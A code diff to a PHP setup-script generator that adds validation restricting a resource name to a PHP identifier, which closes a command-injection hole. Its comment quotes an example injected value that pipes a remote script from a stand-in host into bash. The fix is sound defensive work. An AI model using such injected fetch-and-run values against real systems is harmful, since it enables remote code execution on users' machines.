@@ -87,6 +87,17 @@ final readonly class SetupScriptGenerator
         } else {
             $this->monorepoPath = null;
         }
+
+        // `firstResource` is interpolated into a `php artisan arqel:resource
+        // <value>` line in the generated shell/PowerShell script. It is a model
+        // class name, so restrict it to a PHP identifier — otherwise a value
+        // like `Order; curl evil.sh | bash #` injects a second command that
+        // runs when the user executes the script (command injection).
+        if ($firstResource !== null && preg_match('/^[A-Za-z][A-Za-z0-9_]*$/', $firstResource) !== 1) {
+            throw new InvalidArgumentException(
+                "Invalid resource name '{$firstResource}'. Must start with a letter and contain only letters, numbers or underscores.",
+            );
+        }
     }
 
     public function forBash(): string
